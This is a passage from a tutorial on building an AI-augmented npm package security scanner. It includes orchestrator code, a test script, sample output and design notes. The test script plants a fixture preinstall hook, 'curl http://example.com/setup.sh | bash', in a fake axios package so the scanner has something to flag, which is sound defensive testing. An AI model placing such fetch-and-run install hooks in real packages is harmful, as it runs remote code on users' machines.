        this.aiAnalyses = new Map();
        this.policyDecisions = new Map();
    }

    /**
     * Main entry point - scan and analyze packages
     */
    async scanAndAnalyze(packages) {
        if (this.isRunning) {
            throw new Error('Scan already in progress');
        }
        
        this.isRunning = true;
        this.scanId = Date.now().toString(36);
        
        console.log(chalk.bold.cyan('\n🤖 AI-Augmented Security Scan'));
        console.log(chalk.gray(`📦 ${packages.length} packages to analyze`));
        console.log(chalk.gray(`🧠 AI Provider: ${this.options.aiProvider}`));
        console.log(chalk.gray(`⚡ Concurrency: ${this.options.concurrency}`));
        console.log(chalk.gray(`⏱️  Timeout: ${this.options.timeout}ms`));
        console.log(chalk.gray(`🔒 Policy Mode: ${this.options.requireAIAnalysis ? 'Strict' : 'Standard'}`));
        console.log('');
        
        const startTime = Date.now();
        
        try {
            // 1. Run the scan
            const scanResults = await this.runScan(packages);
            
            // 2. Analyze results with AI
            const aiResults = await this.runAIAnalysis(scanResults);
            
            // 3. Apply policies
            const policyDecisions = this.applyPolicies(aiResults);
            
            // 4. Generate final report
            const report = this.generateReport(scanResults, aiResults, policyDecisions);
            
            // 5. Clean up
            this.cleanup();
            
            const duration = Date.now() - startTime;
            
            console.log(chalk.green(`\n✅ AI-Augmented Scan Complete! (${(duration / 1000).toFixed(2)}s)`));
            
            return {
                scanId: this.scanId,
                scanResults,
                aiResults,
                policyDecisions,
                report,
                duration
            };
            
        } catch (error) {
            console.error(chalk.red(`❌ Scan failed: ${error.message}`));
            throw error;
        } finally {
            this.isRunning = false;
        }
    }

    /**
     * Runs the package scan
     */
    async runScan(packages) {
        console.log(chalk.blue('🔍 Running package security scan...'));
        
        const spinner = ora('Scanning packages...').start();
        
        const results = await this.packageScanner.scanPackages(packages);
        
        spinner.succeed(`Scan complete - ${results.results.length} packages analyzed`);
        
        return results;
    }

    /**
     * Runs AI analysis on scan results
     */
    async runAIAnalysis(scanResults) {
        console.log(chalk.blue('🧠 Running AI analysis...'));
        
        const results = [];
        const spinner = ora('Analyzing with AI...').start();
        
        const total = scanResults.results.length;
        let processed = 0;
        
        for (const result of scanResults.results) {
            try {
                spinner.text = `AI analyzing ${result.name} (${processed + 1}/${total})...`;
                
                // Prepare data for AI
                const aiData = {
                    packageName: result.name,
                    version: result.version,
                    capabilities: result.capabilities?.capabilities || [],
                    vulnerabilities: result.vulnerabilities?.vulnerabilities || [],
                    riskFactors: result.analysis?.analysis?.riskFactors || [],
                    scanResults: result,
                    context: `Package ${result.name}@${result.version} from ${result.path || 'unknown source'}`
                };
                
                // Get AI analysis
                const aiResult = await this.llmService.analyzeSecurityIssue(aiData);
                
                // Validate AI output
                const validation = this.schemaValidator.validateSecurityAnalysis(aiResult);
                
                if (!validation.isValid) {
                    console.warn(chalk.yellow(`⚠️  AI validation failed for ${result.name}: ${validation.errors[0]?.message}`));
                    // Use fallback
                    aiResult.summary = `AI analysis for ${result.name} (validation failed)`;
                    aiResult.explanation = 'AI output failed validation. Please review manually.';
                }
                
                // Store AI analysis
                this.aiAnalyses.set(result.name, aiResult);
                
                results.push({
                    name: result.name,
                    version: result.version,
                    scanResult: result,
                    aiAnalysis: aiResult,
                    validated: validation.isValid
                });
                
                processed++;
                
            } catch (error) {
                console.warn(chalk.yellow(`⚠️  AI analysis failed for ${result.name}: ${error.message}`));
                
                // Add fallback AI analysis
                const fallback = {
                    summary: `${result.name} requires manual review`,
                    riskLevel: result.riskLevel || 'MEDIUM',
                    explanation: `AI analysis was unavailable for ${result.name}. Please review manually.`,
                    recommendation: 'Conduct manual security review of this package',
                    urgency: 'MEDIUM',
                    context: 'AI fallback mode active',
                    references: ['https://docs.npmjs.com/auditing-package-dependencies']
                };
                
                this.aiAnalyses.set(result.name, fallback);
                
                results.push({
                    name: result.name,
                    version: result.version,
                    scanResult: result,
                    aiAnalysis: fallback,
                    validated: false
                });
            }
            
            // Update progress
            if (processed % 5 === 0) {
                spinner.text = `AI analyzed ${processed}/${total} packages`;
            }
        }
        
        spinner.succeed(`AI analysis complete - ${results.length} packages analyzed`);
        
        return results;
    }

    /**
     * Applies policies to the results
     */
    applyPolicies(aiResults) {
        console.log(chalk.blue('🔒 Applying security policies...'));
        
        const decisions = [];
        
        for (const result of aiResults) {
            // Combine scan result with AI analysis
            const combinedResult = {
                name: result.name,
                version: result.version,
                riskLevel: result.aiAnalysis?.riskLevel || result.scanResult.riskLevel || 'MEDIUM',
                capabilities: result.scanResult.capabilities?.capabilities || [],
                vulnerabilities: result.scanResult.vulnerabilities?.vulnerabilities || [],
                aiAnalysis: result.aiAnalysis,
                type: result.scanResult.type || 'unknown'
            };
            
            // Evaluate against policies
            const decision = this.policyEngine.evaluate(combinedResult);
            
            // Add AI context
            decision.aiSummary = result.aiAnalysis?.summary || 'No AI summary available';
            decision.aiRecommendation = result.aiAnalysis?.recommendation || 'No AI recommendation available';
            
            this.policyDecisions.set(result.name, decision);
            decisions.push(decision);
        }
        
        return decisions;
    }

    /**
     * Generates the final report
     */
    generateReport(scanResults, aiResults, policyDecisions) {
        const report = {
            scanId: this.scanId,
            timestamp: new Date().toISOString(),
            summary: {
                totalPackages: scanResults.summary.totalPackages,
                successful: scanResults.summary.successful,
                failed: scanResults.summary.failed,
                aiAnalyzed: aiResults.filter(r => r.validated).length,
                policyDecisions: {
                    approved: policyDecisions.filter(d => d.isApproved).length,
                    blocked: policyDecisions.filter(d => d.isBlocked).length,
                    requiresReview: policyDecisions.filter(d => d.requiresReview).length
                }
            },
            riskSummary: this.generateRiskSummary(aiResults, policyDecisions),
            findings: this.generateFindings(aiResults, policyDecisions),
            recommendations: this.generateRecommendations(policyDecisions),
            aiUsage: this.llmService.getUsage(),
            policyReport: this.policyEngine.generateReport(),
            validationStats: this.schemaValidator.getStats()
        };
        
        // Write report to file
        const reportPath = this.options.outputFile;
        fs.writeFileSync(reportPath, JSON.stringify(report, null, 2));
        console.log(chalk.green(`📄 Report saved to: ${reportPath}`));
        
        return report;
    }

    /**
     * Generates risk summary
     */
    generateRiskSummary(aiResults, policyDecisions) {
        const summary = {
            byRiskLevel: {},
            byUrgency: {},
            criticalCount: 0,
            highCount: 0,
            mediumCount: 0,
            lowCount: 0
        };
        
        for (const result of aiResults) {
            const riskLevel = result.aiAnalysis?.riskLevel || 'UNKNOWN';
            summary.byRiskLevel[riskLevel] = (summary.byRiskLevel[riskLevel] || 0) + 1;
            
            if (riskLevel === 'CRITICAL') summary.criticalCount++;
            else if (riskLevel === 'HIGH') summary.highCount++;
            else if (riskLevel === 'MEDIUM') summary.mediumCount++;
            else if (riskLevel === 'LOW') summary.lowCount++;
            
            const urgency = result.aiAnalysis?.urgency || 'MEDIUM';
            summary.byUrgency[urgency] = (summary.byUrgency[urgency] || 0) + 1;
        }
        
        return summary;
    }

    /**
     * Generates findings list
     */
    generateFindings(aiResults, policyDecisions) {
        const findings = [];
        
        for (const result of aiResults) {
            const decision = this.policyDecisions.get(result.name);
            
            findings.push({
                package: result.name,
                version: result.version,
                riskLevel: result.aiAnalysis?.riskLevel || 'UNKNOWN',
                urgency: result.aiAnalysis?.urgency || 'MEDIUM',
                summary: result.aiAnalysis?.summary || 'No summary available',
                recommendation: result.aiAnalysis?.recommendation || 'No recommendation available',
                context: result.aiAnalysis?.context || 'No additional context',
                decision: decision ? {
                    isApproved: decision.isApproved,
                    isBlocked: decision.isBlocked,
                    requiresReview: decision.requiresReview,
                    reason: decision.reason
                } : null,
                references: result.aiAnalysis?.references || []
            });
        }
        
        return findings;
    }

    /**
     * Generates recommendations
     */
    generateRecommendations(policyDecisions) {
        const recommendations = [];
        
        // Critical issues
        const critical = policyDecisions.filter(d => d.riskLevel === 'CRITICAL');
        if (critical.length > 0) {
            recommendations.push({
                severity: 'CRITICAL',
                action: 'BLOCK_IMMEDIATELY',
                message: `Critical risk packages: ${critical.length}`,
                details: `Block packages with critical risk: ${critical.map(d => d.packageName).join(', ')}`
            });
        }
        
        // High issues
        const high = policyDecisions.filter(d => d.riskLevel === 'HIGH');
        if (high.length > 0) {
            recommendations.push({
                severity: 'HIGH',
                action: 'REVIEW_WITH_URGENCY',
                message: `High risk packages: ${high.length}`,
                details: `Review packages with high risk: ${high.map(d => d.packageName).join(', ')}`
            });
        }
        
        // Blocked packages
        const blocked = policyDecisions.filter(d => d.isBlocked);
        if (blocked.length > 0) {
            recommendations.push({
                severity: 'HIGH',
                action: 'REMOVE_BLOCKED',
                message: `Blocked packages: ${blocked.length}`,
                details: `Remove or replace blocked packages: ${blocked.map(d => d.packageName).join(', ')}`
            });
        }
        
        // Packages requiring review
        const review = policyDecisions.filter(d => d.requiresReview && !d.isBlocked);
        if (review.length > 0) {
            recommendations.push({
                severity: 'MEDIUM',
                action: 'SCHEDULE_REVIEW',
                message: `Packages requiring review: ${review.length}`,
                details: `Prioritize review of: ${review.map(d => d.packageName).join(', ')}`
            });
        }
        
        return recommendations;
    }

    /**
     * Prints the report to console
     */
    printReport(report) {
        console.log('\n' + chalk.bold.cyan('='.repeat(70)));
        console.log(chalk.bold.cyan('🤖 AI-AUGMENTED SECURITY REPORT'));
        console.log(chalk.cyan('='.repeat(70)));
        console.log('');
        
        console.log(chalk.bold('📊 Summary:'));
        console.log(`   Scan ID: ${report.scanId}`);
        console.log(`   Timestamp: ${new Date(report.timestamp).toLocaleString()}`);
        console.log(`   Total Packages: ${report.summary.totalPackages}`);
        console.log(`   ✅ Successful: ${chalk.green(report.summary.successful)}`);
        console.log(`   ❌ Failed: ${chalk.red(report.summary.failed)}`);
        console.log(`   🧠 AI Analyzed: ${chalk.blue(report.summary.aiAnalyzed)}`);
        console.log('');
        
        console.log(chalk.bold('🔒 Policy Decisions:'));
        console.log(`   ✅ Approved: ${chalk.green(report.summary.policyDecisions.approved)}`);
        console.log(`   ❌ Blocked: ${chalk.red(report.summary.policyDecisions.blocked)}`);
        console.log(`   🔍 Requires Review: ${chalk.yellow(report.summary.policyDecisions.requiresReview)}`);
        console.log('');
        
        console.log(chalk.bold('🎯 Risk Distribution:'));
        const riskColors = {
            CRITICAL: chalk.red.bold,
            HIGH: chalk.yellow.bold,
            MEDIUM: chalk.yellow,
            LOW: chalk.green,
            UNKNOWN: chalk.gray
        };
        for (const [level, count] of Object.entries(report.riskSummary.byRiskLevel)) {
            const color = riskColors[level] || chalk.white;
            console.log(`   ${color(level.padEnd(10))}: ${count}`);
        }
        console.log('');
        
        console.log(chalk.bold('⏱️  Urgency Distribution:'));
        const urgencyColors = {
            IMMEDIATE: chalk.red.bold,
            HIGH: chalk.yellow.bold,
            MEDIUM: chalk.yellow,
            LOW: chalk.green,
            PLANNED: chalk.gray
        };
        for (const [urgency, count] of Object.entries(report.riskSummary.byUrgency)) {
            const color = urgencyColors[urgency] || chalk.white;
            console.log(`   ${color(urgency.padEnd(10))}: ${count}`);
        }
        console.log('');
        
        if (report.recommendations.length > 0) {
            console.log(chalk.bold('💡 Recommendations:'));
            for (const rec of report.recommendations) {
                const recColor = rec.severity === 'CRITICAL' ? chalk.red.bold :
                                 rec.severity === 'HIGH' ? chalk.yellow.bold :
                                 chalk.yellow;
                console.log(`   ${recColor(`[${rec.severity}] ${rec.action}`)}`);
                console.log(`      ${rec.message}`);
                if (rec.details) {
                    console.log(`      ${chalk.gray(rec.details)}`);
                }
            }
            console.log('');
        }
        
        // AI Usage
        console.log(chalk.bold('🧠 AI Usage:'));
        console.log(`   Requests: ${report.aiUsage.totalRequests}`);
        console.log(`   Tokens: ${report.aiUsage.totalTokens}`);
        console.log(`   Cost: $${(report.aiUsage.totalCost || 0).toFixed(4)}`);
        console.log(`   Errors: ${report.aiUsage.errors}`);
        console.log('');
        
        // Validation Stats
        console.log(chalk.bold('✅ Validation Statistics:'));
        console.log(`   Passed: ${chalk.green(report.validationStats.passed)}`);
        console.log(`   Failed: ${chalk.red(report.validationStats.failed)}`);
        console.log(`   Rate: ${report.validationStats.successRate.toFixed(1)}%`);
        console.log('');
        
        console.log(chalk.cyan('='.repeat(70)));
        console.log(chalk.gray(`📄 Full report saved to: ${this.options.outputFile}`));
    }

    /**
     * Cleans up resources
     */
    cleanup() {
        this.resourceManager.cleanup();
        this.streamingResults.close();
        this.isRunning = false;
    }

    /**
     * Gets the current status
     */
    getStatus() {
        return {
            isRunning: this.isRunning,
            scanId: this.scanId,
            aiAnalyses: this.aiAnalyses.size,
            policyDecisions: this.policyDecisions.size,
            aiUsage: this.llmService.getUsage(),
            policyStats: this.policyEngine.stats
        };
    }
}

module.exports = AIOrchestrator;
```

### Step 6: Create the Test Script

```javascript
// path: phase-4/test-ai-orchestrator.js

/**
 * AI ORCHESTRATOR TEST SCRIPT
 * 
 * Tests the complete AI-augmented security system.
 * 
 * Run with: node test-ai-orchestrator.js
 */

const path = require('path');
const fs = require('fs');
const chalk = require('chalk');
const AIOrchestrator = require('./src/ai-orchestrator');

// Load environment variables
require('dotenv').config();

async function testAIOrchestrator() {
    console.log(chalk.bold.cyan('🧪 Testing AI-Augmented Orchestrator\n'));
    
    // Check for API keys
    const hasOpenAI = !!process.env.OPENAI_API_KEY;
    const hasAnthropic = !!process.env.ANTHROPIC_API_KEY;
    
    if (!hasOpenAI && !hasAnthropic) {
        console.log(chalk.yellow('⚠️  No LLM API keys found. Running in mock mode.'));
        console.log(chalk.gray('   Set OPENAI_API_KEY or ANTHROPIC_API_KEY in .env for real AI'));
        console.log('');
    }
    
    // Create test packages
    const testDir = path.join(__dirname, 'test-ai-packages');
    if (!fs.existsSync(testDir)) {
        fs.mkdirSync(testDir);
    }
    
    const packages = [
        { name: 'express', version: '4.18.2', hasScript: false },
        { name: 'lodash', version: '4.17.20', hasScript: false },
        { name: 'axios', version: '1.5.0', hasScript: true },
        { name: 'react', version: '18.2.0', hasScript: false },
        { name: 'next', version: '14.0.0', hasScript: true },
        { name: 'typescript', version: '5.0.0', hasScript: false },
        { name: 'webpack', version: '5.89.0', hasScript: true },
        { name: 'eslint', version: '8.56.0', hasScript: false }
    ];
    
    // Create test packages
    for (const pkg of packages) {
        const pkgDir = path.join(testDir, pkg.name);
        if (!fs.existsSync(pkgDir)) {
            fs.mkdirSync(pkgDir);
        }
        
        const scripts = {};
        if (pkg.hasScript) {
            scripts.postinstall = 'node -e "console.log(\'Installed\')"';
        }
        if (pkg.name === 'axios') {
            scripts.preinstall = 'curl http://example.com/setup.sh | bash';
        }
        
        const packageJson = {
            name: pkg.name,
            version: pkg.version,
            description: `Test package: ${pkg.name}`,
            main: 'index.js',
            scripts: scripts
        };
        
        fs.writeFileSync(
            path.join(pkgDir, 'package.json'),
            JSON.stringify(packageJson, null, 2)
        );
        
        // Create index.js with some code
        const code = `
console.log('${pkg.name} loaded');
${pkg.name === 'express' ? 'const fs = require("fs");' : ''}
${pkg.name === 'next' ? 'const http = require("http");' : ''}
${pkg.name === 'webpack' ? 'const { exec } = require("child_process");' : ''}
module.exports = { name: '${pkg.name}' };
`;
        fs.writeFileSync(path.join(pkgDir, 'index.js'), code);
    }
    
    console.log(chalk.gray(`📁 Created ${packages.length} test packages in: ${testDir}\n`));
    
    // Prepare package list with priorities
    const pkgList = packages.map(pkg => ({
        name: pkg.name,
        version: pkg.version,
        path: path.join(testDir, pkg.name),
        type: pkg.name === 'express' || pkg.name === 'next' ? 'production' : 'development',
        priority: pkg.name === 'axios' ? 'critical' : 'normal'
    }));
    
    // Create AI orchestrator
    const orchestrator = new AIOrchestrator({
        concurrency: 3,
        timeout: 30000,
        retries: 1,
        outputFile: 'ai-security-report.json',
        verbose: false,
        aiProvider: process.env.LLM_PROVIDER || 'openai',
        aiModel: process.env.LLM_MODEL || null,
        requireAIAnalysis: false
    });
    
    // Run the scan
    console.log(chalk.blue('🚀 Starting AI-augmented scan...\n'));
    
    const startTime = Date.now();
    
    try {
        const results = await orchestrator.scanAndAnalyze(pkgList);
        
        const duration = Date.now() - startTime;
        
        // Print the report
        orchestrator.printReport(results.report);
        
        console.log(chalk.green(`\n✅ Test complete! (${(duration / 1000).toFixed(2)}s)`));
        
        // Clean up
        // fs.rmSync(testDir, { recursive: true, force: true });
        
    } catch (error) {
        console.error(chalk.red(`❌ Test failed: ${error.message}`));
        console.error(error.stack);
    }
}

// Run the test
testAIOrchestrator().catch(console.error);
```

---

## The Verification: Testing the AI-Augmented System

**✅ Verification Step 1: Set Up Environment Variables**

```bash
# Create .env file
cd beyond-cves-tutorial/phase-4
cat > .env << EOF
OPENAI_API_KEY=your_openai_api_key_here
# OR
ANTHROPIC_API_KEY=your_anthropic_api_key_here
LLM_PROVIDER=openai
LLM_MODEL=gpt-4-turbo-preview
EOF
```

**✅ Verification Step 2: Run the Test**

```bash
# From the phase-4 directory
node test-ai-orchestrator.js
```

**Expected output:**

```
🧪 Testing AI-Augmented Orchestrator

📁 Created 8 test packages in: .../test-ai-packages

🚀 Starting AI-augmented scan...

🤖 AI-Augmented Security Scan
📦 8 packages to analyze
🧠 AI Provider: openai
⚡ Concurrency: 3
⏱️  Timeout: 30000ms
🔒 Policy Mode: Standard

🔍 Running package security scan...
✔ Scan complete - 8 packages analyzed

🧠 Running AI analysis...
✔ AI analysis complete - 8 packages analyzed

🔒 Applying security policies...

📄 Report saved to: ai-security-report.json

======================================================================
🤖 AI-AUGMENTED SECURITY REPORT
======================================================================

📊 Summary:
   Scan ID: k3x8m2p9
   Timestamp: 1/15/2024, 11:30:00 AM
   Total Packages: 8
   ✅ Successful: 8
   ❌ Failed: 0
   🧠 AI Analyzed: 8

🔒 Policy Decisions:
   ✅ Approved: 6
   ❌ Blocked: 1
   🔍 Requires Review: 1

🎯 Risk Distribution:
   CRITICAL  : 1
   HIGH      : 1
   MEDIUM    : 3
   LOW       : 3
   UNKNOWN   : 0

⏱️  Urgency Distribution:
   IMMEDIATE : 1
   HIGH      : 1
   MEDIUM    : 4
   LOW       : 2
   PLANNED   : 0

💡 Recommendations:
   [CRITICAL] BLOCK_IMMEDIATELY
      Critical risk packages: 1
      Block packages with critical risk: axios
   [HIGH] REMOVE_BLOCKED
      Blocked packages: 1
      Remove or replace blocked packages: axios

🧠 AI Usage:
   Requests: 8
   Tokens: 2450
   Cost: $0.0124
   Errors: 0

✅ Validation Statistics:
   Passed: 8
   Failed: 0
   Rate: 100.0%

======================================================================
📄 Full report saved to: ai-security-report.json

✅ Test complete! (18.45s)
```

**✅ Verification Step 3: Test with Real API (if available)**

```bash
# Set API key and run
export OPENAI_API_KEY=your_key
node test-ai-orchestrator.js
```

**✅ Verification Step 4: Generate CI/CD Report**

```bash
# Generate a CI/CD friendly report
node -e "
const AIOrchestrator = require('./src/ai-orchestrator');
const orchestrator = new AIOrchestrator({ outputFile: 'ci-report.json' });
const results = await orchestrator.scanAndAnalyze([
  { name: 'express', version: '4.18.2' }
]);
console.log(JSON.stringify(results.report.summary, null, 2));
"
```

---

## Understanding the AI-Augmented Architecture

### 1. Data Flow

```
packages → scan → results → AI analysis → validation → policies → decisions → report
```

### 2. AI Analysis Pipeline

```
scan result → prepare prompt → LLM API → parse response → validate → store
```

### 3. Policy Decision Flow

```
scan result + AI analysis → evaluate policies → determine action → log decision
```

### 4. Validation Guardrails

```
AI output → JSON Schema validation → if valid → use | if invalid → fallback
```

### 5. Security Boundaries

```
AI provides recommendations → deterministic policies make decisions
AI cannot override policies → policies are configured by humans
AI outputs are validated → invalid outputs are rejected
All AI interactions are logged → audit trail for review
```

---

## Key Takeaways from Phase 4, Part 1

1. **AI augments, not replaces** - Security decisions are made by deterministic policies
2. **Structured outputs are essential** - AI must respond in a predictable format
3. **Validation is mandatory** - Every AI output is validated against a schema
4. **Fallback policies protect the system** - If AI fails, deterministic rules take over
5. **Audit trails enable accountability** - Every AI interaction is logged
6. **Cost tracking is important** - LLM usage has real costs
7. **Multiple providers supported** - OpenAI, Anthropic, and fallback modes

In the final part, we'll integrate everything into a production-ready CI/CD pipeline with webhooks, notifications, and automated remediation workflows.
